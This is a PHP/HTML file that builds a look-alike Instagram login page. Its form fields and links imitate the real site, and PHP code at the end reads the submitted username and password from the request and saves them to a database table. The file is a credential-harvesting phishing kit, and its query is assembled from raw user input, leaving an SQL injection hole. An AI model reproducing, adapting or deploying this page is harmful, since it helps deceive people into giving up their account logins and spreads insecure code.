<?php
include 'connection.php'
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css"
        integrity="sha384-DyZ88mC6Up2uqS4h/KRgHuoeGwBcD4Ng9SiP4dIRy0EXTlnuz47vAwmeGwVChigm" crossorigin="anonymous">
    <title>Document</title>
</head>

<body>
    <div class="container">
        <div class="box">
            <div class="heading"></div>
            <form class="login-form">
                <div class="field">
                    <input id="username" type="name" placeholder="Phone number, username, or email" name="username" />
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="field">
                    <input id="password" type="password" placeholder="password" name="password" />
                    <label for="password">Password</label>
                </div>
                <button class="login-button" title="login">Log In</button>
                <div class="separator">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>
                <div class="other">
                    <button class="fb-login-btn" type="button">
                        <i class="fab fa-facebook-square"></i>
                        <span class="">Log in with Facebook</span>
                    </button>
                    <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/">Forgot
                        password?</a>
                </div>
            </form>
        </div>
        <div class="box">
            <p>Don't have an account? <a class="signup" href="https://www.instagram.com/accounts/emailsignup/">Sign
                    Up</a></p>
        </div>
    </div>
    <div class="img-wrap">
        <p>Get the app.</p>
        <img src="/applogo/appstore.png" alt="">
        <img src="/applogo/playstore.png" alt="">
    </div>
</body>
</html>
</html>

<?php

$username=$_GET['username'];
$password=$_GET['password'];

$query="INSERT INTO NEWPAGE VALUES ('$username','$password')";
$data=mysqli_query($conn,$query);

if ($data) {
    // echo "DATA INSERTED INTO DATABASE";
}
else {
    "Failed to insert into database";
}

?>
